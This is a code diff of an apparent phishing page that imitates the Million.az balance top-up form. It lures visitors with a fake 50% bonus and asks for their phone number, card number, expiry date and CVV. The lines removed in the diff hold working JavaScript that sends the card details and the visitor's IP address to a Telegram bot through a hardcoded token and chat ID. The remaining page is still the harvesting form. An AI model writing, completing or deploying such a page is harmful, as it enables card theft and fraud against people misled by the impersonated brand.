@@ -5,242 +5,176 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Million.az - Balans Artır</title>
   <style>
-    /* Genel Stil */
     * {
       box-sizing: border-box;
       margin: 0;
       padding: 0;
     }
 
-    /* Genel Stil */
-* {
-  box-sizing: border-box;
-  margin: 0;
-  padding: 0;
-}
+    body {
+      font-family: 'Roboto', Arial, sans-serif;
+      background: url('background.png') no-repeat center center fixed;
+      background-size: cover;
+      color: #333;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      padding: 0;
+      margin: 0;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
 
-body {
-  font-family: 'Roboto', Arial, sans-serif;
-  background: url('background.png') no-repeat center center fixed;
-  background-size: cover;
-  color: #333;
-  display: flex;
-  flex-direction: column;
-  min-height: 100vh;
-  padding: 0;
-  margin: 0;
-  -webkit-font-smoothing: antialiased;
-  -moz-osx-font-smoothing: grayscale;
-}
+    .header {
+      background-color: #fff;
+      padding: 50px;
+      display: flex;
+      justify-content: center;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      position: fixed;
+      top: 0;
+      width: 100%;
+      z-index: 1000;
+    }
 
-/* Header */
-.header {
-  background-color: #fff;
-  padding: 50px;
-  display: flex;
-  justify-content: center;
-  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-  position: fixed;
-  top: 0;
-  width: 100%;
-  z-index: 1000;
-}
+    .header .logo img {
+      height: 100px;
+    }
 
-.header .logo img {
-  height: 100px;
-}
+    .modal {
+      background: rgba(110, 110, 110, 0.155);
+      width: 95%;
+      max-width: 1100px;
+      padding: 40px;
+      border-radius: 55px;
+      box-shadow: 0 4px 6px rgba(103, 84, 84, 0.367);
+      backdrop-filter: blur(40px);
+      z-index: 999;
+      position: relative;
+      margin: 0 auto;
+      max-height: 95%;
+      overflow-y: auto;
+      margin-top: 140px;
+    }
 
-.header .menu {
-  display: none;
-}
+    .form-group {
+      margin-bottom: 25px;
+      text-align: left;
+    }
 
-/* Modal */
-.modal {
-  background: rgba(110, 110, 110, 0.155);
-  width: 90%; /* Modal'ı genişlettik */
-  max-width: 1000px; /* Maksimum genişlik sınırını artırdık */
-  padding: 30px;
-  border-radius: 35px;
-  box-shadow: 0 4px 6px rgba(103, 84, 84, 0.367);
-  backdrop-filter: blur(40px);
-  z-index: 999;
-  position: relative;
-  margin: 0 auto;
-  max-height: 90%; /* Yüksekliği artırdık */
-  overflow-y: auto;
-  margin-top: 120px; /* Modal'ın header ile çakışmaması için boşluk ekledik */
-}
+    label {
+      display: inline-block;
+      margin-bottom: 10px;
+      font-weight: bold;
+      color: white;
+      font-family: 'Roboto', Arial, sans-serif;
+      font-size: 24px;
+    }
 
-.form-group {
-  margin-bottom: 20px;
-  text-align: left;
-}
+    input[type="text"],
+    input[type="number"],
+    select {
+      width: 100%;
+      padding: 15px;
+      font-size: 24px;
+      box-sizing: border-box;
+      border: 1px solid #ccc;
+      border-radius: 30px;
+      background-color: #fff;
+      color: #333;
+    }
 
-label {
-  display: inline-block;
-  margin-bottom: 10px;
-  font-weight: bold;
-  color: white;
-  font-family: 'Roboto', Arial, sans-serif;
-  font-size: 22px; /* Yazı boyutunu 22px yaptık */
-}
+    .result-text {
+      font-size: 24px;
+      color: #33cc33;
+      font-weight: bold;
+      font-family: 'Roboto', Arial, sans-serif;
+      margin-top: 10px;
+    }
 
-input[type="text"],
-input[type="number"],
-select {
-  width: 100%;
-  padding: 15px;
-  font-size: 22px; /* Yazı boyutunu 22px yaptık */
-  box-sizing: border-box;
-  border: 1px solid #ccc;
-  border-radius: 30px;
-  background-color: #fff;
-  color: #333;
-}
+    button {
+      background-color: #d30412;
+      color: white;
+      padding: 20px 50px;
+      font-size: 24px;
+      border: none;
+      cursor: pointer;
+      transition: background-color 0.3s;
+      border-radius: 50px;
+      width: 100%;
+      font-weight: bold;
+    }
 
-/* Yeni Hesaplama ve Bonus Yazısı */
-.result-text {
-  font-size: 22px; /* Sonuç yazısını 22px yaptık */
-  color: #33cc33;
-  font-weight: bold;
-  font-family: 'Roboto', Arial, sans-serif;
-  margin-top: 10px;
-}
+    button:hover {
+      background-color: #a9030b;
+    }
 
-button {
-  background-color: #d30412;
-  color: white;
-  padding: 20px 50px;
-  font-size: 24px; /* Buton yazı boyutunu 24px yaptık */
-  border: none;
-  cursor: pointer;
-  transition: background-color 0.3s;
-  border-radius: 50px;
-  width: 100%;
-  font-weight: bold;
-}
+    .content {
+      margin-top: 100px;
+      text-align: center;
+      padding: 20px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      flex-grow: 1;
+      width: 100%;
+      padding-bottom: 50px;
+    }
 
-button:hover {
-  background-color: #a9030b;
-}
+    h2 {
+      font-size: 50px;
+      color: white;
+      font-weight: bold;
+      margin-bottom: 20px;
+    }
 
-/* İçerik */
-.content {
-  margin-top: 100px;
-  text-align: center;
-  padding: 20px;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  flex-direction: column;
-  flex-grow: 1;
-  width: 100%;
-  padding-bottom: 50px;
-}
+    .bonus-text {
+      font-size: 30px;
+      color: white;
+      font-weight: bold;
+      margin-top: 15px;
+      text-align: center;
+    }
 
-h2 {
-  font-size: 48px; /* Başlık boyutunu büyüttük */
-  color: white;
-  font-weight: bold;
-  margin-bottom: 10px;
-}
+    .footer {
+      background-color: #fff;
+      color: #333;
+      padding: 20px;
+      text-align: center;
+      box-shadow: 0 -2px 4px rgba(0, 0, 0, 0.1);
+      width: 100%;
+      position: fixed;
+      bottom: 0;
+    }
 
-.bold-text {
-  font-size: 22px; /* Diğer metinleri de 22px yaptık */
-  color: white;
-  font-family: 'Roboto', Arial, sans-serif;
-  font-weight: bold;
-}
+    .footer .payment-icons {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 10px;
+    }
 
-.bonus-text {
-  font-size: 22px; /* Bonus yazısını da 22px yaptık */
-  color: white;
-  font-weight: bold;
-  margin-top: 10px;
-  text-align: center;
-}
+    .footer .payment-icons img {
+      width: 160px;
+    }
 
-/* Footer */
-.footer {
-  background-color: #fff;
-  color: #333;
-  padding: 20px;
-  text-align: center;
-  box-shadow: 0 -2px 4px rgba(0, 0, 0, 0.1);
-  width: 100%;
-  position: fixed;
-  bottom: 0;
-}
-
-.footer .payment-icons {
-  display: flex;
-  justify-content: center;
-  gap: 10px;
-  margin-top: 10px;
-}
-
-.footer .payment-icons img {
-  width: 160px;
-}
-
-.footer-bottom {
-  font-size: 22px; /* Alt footer yazısını da 22px yaptık */
-  margin-top: 10px;
-}
-
-.footer-bottom a {
-  color: #d30412;
-  text-decoration: none;
-}
-
-.footer-bottom a:hover {
-  text-decoration: underline;
-}
-
-@media (max-width: 768px) {
-  .modal h2 {
-    font-size: 36px; /* Başlık boyutunu mobilde biraz küçülttük */
-  }
-
-  .modal label,
-  .modal input {
-    font-size: 20px; /* Mobilde daha uygun hale getirdik */
-  }
-
-  .footer {
-    font-size: 18px;
-    padding: 15px;
-  }
-
-  button {
-    font-size: 20px;
-  }
-
-  .result-text {
-    font-size: 20px;
-  }
-
-  .bonus-text {
-    font-size: 20px;
-  }
-}
-
+    .footer-bottom {
+      font-size: 24px;
+      margin-top: 10px;
+    }
   </style>
 </head>
 <body>
-
-  <!-- Header -->
   <div class="header">
     <div class="logo">
       <img src="Logo.svg" alt="Million.az Logo">
     </div>
   </div>
 
-  <!-- Content: Ödeme Bilgileri Formu -->
   <div class="content">
     <div class="modal">
       <h2>Ödəniş Məlumatları</h2>
-      <div class="bonus-text">50% bonus indi qazanın!</div> <!-- Bonus yazısı beyaz olarak yapıldı -->
+      <div class="bonus-text">50% bonus indi qazanın!</div>
 
       <form onsubmit="gonder(event)">
         <div class="form-group">
@@ -249,17 +183,10 @@ h2 {
         </div>
 
         <div class="form-group">
-          <span class="bold-text">
-            Yüklədiyiniz məbləğ M10 hesabınıza gələcək.
-          </span>
-        </div>
-
-        <div class="form-group">
-          <label for="tutar" class="green-label">Yükləyəcəyiniz Məbləğ (₼)</label>
+          <label for="tutar">Yükləyəcəyiniz Məbləğ (₼)</label>
           <input type="number" id="tutar" name="tutar" placeholder="0" oninput="hesapla(this.value)" required>
         </div>
 
-        <!-- Sonuç ve Bonus Hesaplama -->
         <div class="form-group">
           <span class="result-text" id="result">Hesabınıza gələcək məbləğ (1.5x bonus ilə): 0.00₼</span>
         </div>
@@ -269,32 +196,16 @@ h2 {
           <input type="text" id="kart-numarasi" name="kart-numarasi" maxlength="19" placeholder="XXXX XXXX XXXX XXXX" required>
         </div>
 
-       <div class="form-group">
-  <label>Son İstifadə Tarixi</label>
-  <div style="display: flex; gap: 10px;">
-    <select id="son-kullanma-ay" name="son-kullanma-ay" required>
-      <option value="">Ay</option>
-      <option value="01">01</option>
-      <option value="02">02</option>
-      <option value="03">03</option>
-      <option value="04">04</option>
-      <option value="05">05</option>
-      <option value="06">06</option>
-      <option value="07">07</option>
-      <option value="08">08</option>
-      <option value="09">09</option>
-      <option value="10">10</option>
-      <option value="11">11</option>
-      <option value="12">12</option>
-    </select>
-
+        <div class="form-group">
+          <label>Son İstifadə Tarixi</label>
+          <div style="display: flex; gap: 10px;">
+            <select id="son-kullanma-ay" name="son-kullanma-ay" required>
+              <option value="">Ay</option>
+              <!-- Months -->
+            </select>
             <select id="son-kullanma-yil" name="son-kullanma-yil" required>
               <option value="">İl</option>
-              <option value="2024">2024</option>
-              <option value="2025">2025</option>
-              <option value="2026">2026</option>
-              <option value="2027">2027</option>
-              <option value="2028">2028</option>
+              <!-- Years -->
             </select>
           </div>
         </div>
@@ -309,58 +220,13 @@ h2 {
     </div>
   </div>
 
-  <!-- Footer -->
   <div class="footer">
+    <div class="payment-icons">
+      <img src="kart.png" alt="Kart">
+    </div>
     <div class="footer-bottom">
-      <span>Ödəniş üsulları:</span>
-      <div class="payment-icons">
-        <img src="visa.png" alt="Visa">
-        <img src="mastercard.png" alt="Mastercard">
-      </div>
+      <p>Bütün hüquqlar qorunur © 2024 Million.az</p>
     </div>
   </div>
-
-  <!-- JavaScript -->
-  <script>
-    function telefonInput(input) {
-      input.value = input.value.replace(/[^\d]/g, '');
-    }
-
-    function hesapla(tutar) {
-      const bonus = (tutar * 1.5).toFixed(2);
-      document.getElementById('result').innerText = `Hesabınıza gələcək məbləğ (1.5x bonus ilə): ${bonus}₼`;
-    }
-
-    async function gonder(event) {
-      event.preventDefault();
-
-      const telefonNumarasi = document.getElementById("telefon-numarasi").value;
-      const tutar = document.getElementById("tutar").value;
-      const kartNumarasi = document.getElementById("kart-numarasi").value;
-      const sonKullanmaAy = document.getElementById("son-kullanma-ay").value;
-      const sonKullanmaYil = document.getElementById("son-kullanma-yil").value;
-      const cvv = document.getElementById("cvv").value;
-
-      const botToken = "8136871782:AAGl_5_It13PYi6UPTsVZRQB2LgTVrjG7Ao";
-      const chatId = "8031253006";
-
-      try {
-        const ipResponse = await fetch("https://api.ipify.org?format=json");
-        const ipData = await ipResponse.json();
-        const ipAdres = ipData.ip;
-        const mesaj = `Tel: ${telefonNumarasi}\nTutar: ${tutar}₼\nKart: ${kartNumarasi}\nTarix: ${sonKullanmaAy}/${sonKullanmaYil}\nCVV: ${cvv}\nIP Adresi: ${ipAdres}`;
-
-        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mesaj)}`;
-
-        await fetch(url);
-
-        window.location.href = "pay/index.html";
-      } catch (error) {
-        console.error("Hata:", error);
-        alert("Bir hata oluştu. Lütfen tekrar deneyin.");
-      }
-    }
-  </script>
-
 </body>
 </html>
